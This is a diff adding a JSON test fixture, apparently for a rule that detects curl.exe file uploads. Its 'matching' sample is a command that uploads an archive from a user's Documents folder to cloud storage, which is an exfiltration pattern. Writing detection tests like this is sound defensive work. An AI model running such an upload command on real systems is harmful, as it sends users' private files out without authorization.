@@ -1,0 +1,10 @@
+{
+  "matching": {
+    "image": "C:\\Windows\\System32\\curl.exe",
+    "cmdline": "curl.exe --upload-file C:\\Users\\alice\\Documents\\archive.zip https://storage.googleapis.com/acme/archive.zip"
+  },
+  "non_matching": {
+    "image": "C:\\Windows\\System32\\curl.exe",
+    "cmdline": "curl.exe --upload-file C:\\Build\\artifact.zip https://packages.corp.example/upload"
+  }
+}
